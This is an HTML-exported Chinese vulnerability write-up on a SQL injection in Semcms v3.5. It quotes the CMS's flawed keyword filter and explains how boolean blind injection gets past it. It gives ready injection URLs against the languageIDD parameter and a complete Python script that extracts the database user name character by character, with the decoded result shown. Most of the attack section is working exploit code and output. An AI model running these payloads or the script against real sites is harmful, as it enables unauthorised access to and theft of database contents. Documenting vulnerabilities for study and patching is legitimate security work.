<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs508254C{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;text-decoration: none;}
			.cs4B51D5E4{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs1C2E50E7{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="semcms-v35-sql注入漏洞"><span class="csDE05BCC">Semcms v3.5 sql</span><span class="csECDA2D3">注入漏洞</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一、漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<h2 class="cs868C439D">
			<a name="二、漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">Semcms v3.5</span></p><h2 class="cs868C439D">
			<a name="三、复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h3 class="cs868C439D">
			<a name="漏洞分析"><span class="csD6CA00D2">漏洞分析</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">在分析过程中看到网上已经有人发现</span><span class="cs8926E06">semcms V2.4</span><span class="cs9C1B1871">存在过滤不严导致</span><span class="cs8926E06">sql</span><span class="cs9C1B1871">注入的漏洞，不知道咋还没改，而且最新版过滤的关键字更少了。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">首先查看首页文件</span><span class="cs8926E06">index.php</span><span class="cs9C1B1871">的代码</span></p><p class="cs3A447A38"><span class="cs9FB05234">1 &lt;?php</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">2 include_once &nbsp;&#39;Include/web_inc.php&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">3 include_once &nbsp;&#39;Templete/default/Include/Function.php&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">4 $file_url=&quot;&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">5 include_once &nbsp;&#39;Templete/default/Include/default.php&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">6 ?&gt;</span></p><p class="cs3A447A38"><span class="cs9FB05234">&nbsp;1 //</span><span class="cs7FFD2630">网站</span><span class="cs9FB05234">logo</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> 2 </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> 3 $weblogo=$web_url_meate.str_replace(&#39;../&#39;,&#39;&#39;,$row[&#39;web_logo&#39;]);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> 4 </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> 5 // </span><span class="cs7FFD2630">控制文字标签</span><span class="cs9FB05234"> </span><span class="cs7FFD2630">更改</span><span class="cs9FB05234"> </span><span class="cs7FFD2630">获取的</span><span class="cs9FB05234"> </span><span class="cs7FFD2630">语种</span><span class="cs9FB05234"> id</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> 6 </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> 7 if (isset($_GET[&quot;languageIDD&quot;])){$Language=test_input(verify_str($_GET[&quot;languageIDD&quot;]));}else{$Language=verify_str($Language);}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> 8 </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> 9 if(!empty($Language)){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">10 </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">11 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//</span><span class="cs7FFD2630">网站</span><span class="cs9FB05234">SEO</span><span class="cs7FFD2630">设定</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">12 </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">13 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$query=$db_conn-&gt;query(&quot;select * from sc_tagandseo where languageID=$Language&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">14 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$row=mysqli_fetch_array($query);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">15 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$tag_indexmetatit=datato($row[&#39;tag_indexmetatit&#39;]);// </span><span class="cs7FFD2630">首页标题</span></p><p class="cs3A447A38"><span class="cs9FB05234">&nbsp;1 // </span><span class="cs7FFD2630">防</span><span class="cs9FB05234">sql</span><span class="cs7FFD2630">入注</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> 2 </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> 3 if (isset($_GET)){$GetArray=$_GET;}else{$GetArray=&#39;&#39;;} </span><span class="cs7FFD2630">　　　　</span><span class="cs9FB05234">//</span><span class="cs7FFD2630">所有</span><span class="cs9FB05234">GET</span><span class="cs7FFD2630">方式提交的变量都进行防注入检查</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> 4 &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> 5 foreach ($GetArray as $value){ //get</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> 6 &nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> 7 &nbsp;&nbsp;&nbsp;&nbsp;verify_str($value);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> 8 &nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> 9 }</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">10 </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">11 function inject_check_sql($sql_str) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">12 &nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">13 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return preg_match(&#39;/select|insert|=|%|&lt;|between|update|\&#39;|\*|union|into|load_file|outfile/i&#39;,$sql_str);</span><span class="cs7FFD2630">　　　　</span><span class="cs9FB05234">//</span><span class="cs7FFD2630">过滤关键字</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">14 } </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">15 </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">16 function verify_str($str) { </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">17 &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">18 &nbsp;&nbsp;&nbsp;if(inject_check_sql($str)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">19 &nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">20 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit(&#39;Sorry,You do this is wrong! (.-.)&#39;);</span><span class="cs7FFD2630">　　　　　　</span><span class="cs9FB05234">//</span><span class="cs7FFD2630">如果出现关键字则提示</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">21 &nbsp;&nbsp;&nbsp;&nbsp;} </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">22 &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">23 &nbsp;&nbsp;&nbsp;&nbsp;return $str; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">24 }</span></p><p class="cs3A447A38"><span class="cs9FB05234">&nbsp;1 function test_input($data) { </span><span class="cs7FFD2630">　　　　　　　　　　　　　　　　　　</span><span class="cs9FB05234">//</span><span class="cs7FFD2630">防止</span><span class="cs9FB05234">XSS</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> 2 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$data = str_replace(&quot;&lt;script&quot;, &quot;&quot;, $data);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> 3 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$data = str_replace(&quot;&lt;/script&gt;&quot;, &quot;&quot;, $data);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> 4 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$data = str_replace(&quot;%&quot;, &quot;percent&quot;, $data);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> 5 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$data = trim($data);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> 6 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$data = stripslashes($data);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> 7 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$data = htmlspecialchars($data,ENT_QUOTES);</span><span class="cs7FFD2630">　　　　</span><span class="cs9FB05234">//</span><span class="cs7FFD2630">实体编码</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> 8 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return $data;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> 9 </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">10 &nbsp;&nbsp;&nbsp;}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">　　可以看到第</span><span class="cs8926E06">16</span><span class="cs9C1B1871">行的函数</span><span class="cs8926E06">verify_str()</span><span class="cs9C1B1871">调用</span><span class="cs8926E06">inject_check_sql()</span><span class="cs9C1B1871">用来过滤危险字符，函数</span><span class="cs8926E06">test_input</span><span class="cs9C1B1871">用来过滤</span><span class="cs8926E06">xss</span><span class="cs9C1B1871">。其中可以明显地看到第</span><span class="cs8926E06">11</span><span class="cs9C1B1871">行的函数</span><span class="cs8926E06">inject_check_sql()</span><span class="cs9C1B1871">采用白名单的方式是有缺陷的，我们可以用布尔盲注来绕过</span></p><h3 class="cs868C439D">
			<a name="漏洞复现"><span class="csD6CA00D2">漏洞复现</span></a></h3>
		<p class="cs3A447A38"><span class="cs9FB05234">http://0-sec.org/SEMCMS_PHP_3.5/index.php?languageIDD=1 and strcmp(left(user(),1), 0x72) rlike 0</span><span class="cs7FFD2630">　　　　显示正常</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Semcms/Semcms%20v3.5%20sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e_files/image0.png" width="560" height="229" alt="" style="border-width:0px;" /></span></p><p class="cs3A447A38"><span class="cs9FB05234">http://0-sec.org/SEMCMS_PHP_3.5/index.php?languageIDD=1 and strcmp(left(user(),1), 0x73) rlike 0</span><span class="cs7FFD2630">　　　　显示错误</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Semcms/Semcms%20v3.5%20sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e_files/image1.png" width="560" height="205" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">参考网上已有的</span><span class="cs8926E06">fuzz</span><span class="cs9C1B1871">盲注脚本改了下，代码如下</span></p><p class="cs3A447A38"><span class="cs9FB05234">#</span><span class="cs7FFD2630">用</span><span class="cs9FB05234">python3</span><span class="cs7FFD2630">版本</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import requests</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">url = &quot;http://172.19.77.44/SEMCMS_PHP_3.5/index.php?languageIDD=1&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">print(&quot;Testing url: &quot; + url)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#</span><span class="cs7FFD2630">十进制数</span><span class="cs9FB05234">33-126</span><span class="cs7FFD2630">间的</span><span class="cs9FB05234">ascii hex</span><span class="cs7FFD2630">值</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">payload = [&quot;0x21&quot;,&quot;0x22&quot;,&quot;0x23&quot;,&quot;0x24&quot;,&quot;0x25&quot;,&quot;0x26&quot;,&quot;0x27&quot;,&quot;0x28&quot;,&quot;0x29&quot;,&quot;0x2a&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;0x2b&quot;,&quot;0x2c&quot;,&quot;0x2d&quot;,&quot;0x2e&quot;,&quot;0x2f&quot;,&quot;0x30&quot;,&quot;0x31&quot;,&quot;0x32&quot;,&quot;0x33&quot;,&quot;0x34&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;0x35&quot;,&quot;0x36&quot;,&quot;0x37&quot;,&quot;0x38&quot;,&quot;0x39&quot;,&quot;0x3a&quot;,&quot;0x3b&quot;,&quot;0x3c&quot;,&quot;0x3d&quot;,&quot;0x3e&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;0x3f&quot;,&quot;0x40&quot;,&quot;0x41&quot;,&quot;0x42&quot;,&quot;0x43&quot;,&quot;0x44&quot;,&quot;0x45&quot;,&quot;0x46&quot;,&quot;0x47&quot;,&quot;0x48&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;0x49&quot;,&quot;0x4a&quot;,&quot;0x4b&quot;,&quot;0x4c&quot;,&quot;0x4d&quot;,&quot;0x4e&quot;,&quot;0x4f&quot;,&quot;0x50&quot;,&quot;0x51&quot;,&quot;0x52&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;0x53&quot;,&quot;0x54&quot;,&quot;0x55&quot;,&quot;0x56&quot;,&quot;0x57&quot;,&quot;0x58&quot;,&quot;0x59&quot;,&quot;0x5a&quot;,&quot;0x5b&quot;,&quot;0x5c&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;0x5d&quot;,&quot;0x5e&quot;,&quot;0x5f&quot;,&quot;0x60&quot;,&quot;0x61&quot;,&quot;0x62&quot;,&quot;0x63&quot;,&quot;0x64&quot;,&quot;0x65&quot;,&quot;0x66&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;0x67&quot;,&quot;0x68&quot;,&quot;0x69&quot;,&quot;0x6a&quot;,&quot;0x6b&quot;,&quot;0x6c&quot;,&quot;0x6d&quot;,&quot;0x6e&quot;,&quot;0x6f&quot;,&quot;0x70&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;0x71&quot;,&quot;0x72&quot;,&quot;0x73&quot;,&quot;0x74&quot;,&quot;0x75&quot;,&quot;0x76&quot;,&quot;0x77&quot;,&quot;0x78&quot;,&quot;0x79&quot;,&quot;0x7a&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;0x7b&quot;,&quot;0x7c&quot;,&quot;0x7d&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">user = &quot;&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">for b in range(len(payload)):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;for a in payload:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#sql_payload_user = &quot; and strcmp(substr(database(),%s,1), 0x%s) rlike 0&quot; % (b+1, a.replace(&quot;0x&quot;,&quot;&quot;)) &nbsp;&nbsp;&nbsp;#</span><span class="cs7FFD2630">当前数据库名称</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sql_payload_user = &quot; and strcmp(substr(user(),%s,1), 0x%s) rlike 0&quot; % (b+1, a.replace(&quot;0x&quot;,&quot;&quot;)) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#</span><span class="cs7FFD2630">当前数据库用户名</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;res = requests.get(url + sql_payload_user).text</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;res1 = requests.get(url).text</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if len(res) == len(res1): &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#</span><span class="cs7FFD2630">如果返回的内容长度大小一样，则表示匹配成功</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;user = user + a</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&quot; &quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;[*]info : 0x&quot; + user.replace(&quot;0x&quot;,&quot;&quot;).upper())</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&#39;\r&#39;,&quot;Match failed,Next.....&quot;,end=&#39;&#39;)</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">测试结果如下图</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Semcms/Semcms%20v3.5%20sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e_files/image2.png" width="560" height="443" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">解码</span><span class="cs8926E06">ascii hex</span><span class="cs9C1B1871">值</span><span class="cs8926E06">0x726F6F74406C6F63616C686F7374</span><span class="cs9C1B1871">为</span><span class="cs8926E06">root@localhost</span><span class="cs9C1B1871">。当然因为过滤了</span><span class="cs8926E06">select</span><span class="cs9C1B1871">，获取表名就有点困难了，</span><span class="cs8926E06">t00ls</span><span class="cs9C1B1871">中看到有人介绍用</span><span class="cs8926E06">selselectect</span><span class="cs9C1B1871">来绕过的方式跟这个</span><span class="cs8926E06">CMS</span><span class="cs9C1B1871">的过滤方式是不一样的，所以行不通。暂时想到的办法是可以找一与验证密码有关的注点，因为这个注点包含表名，所以可以通过</span><span class="cs8926E06">fuzz</span><span class="cs9C1B1871">猜测其字段名，最后通过字段名取得字段值，可以看下这篇文章</span><span class="cs8926E06"><a class="cs508254C" href="https://depthsecurity.com/blog/blind-sql-injection-burpsuite-like-a-boss"><span class="cs4B51D5E4">blind-sql-injection-burpsuite-like-a-boss(</span><span class="cs1C2E50E7">要翻墙</span><span class="cs4B51D5E4">)</span></a></span></p><h2 class="cs868C439D">
			<a name="参考链接"><span class="cs83F14626">参考链接</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs8926E06"><a class="cs508254C" href="https://www.cnblogs.com/st404/p/10087191.html"><span class="cs4B51D5E4">https://www.cnblogs.com/st404/p/10087191.html</span></a></span></p></body>
</html>
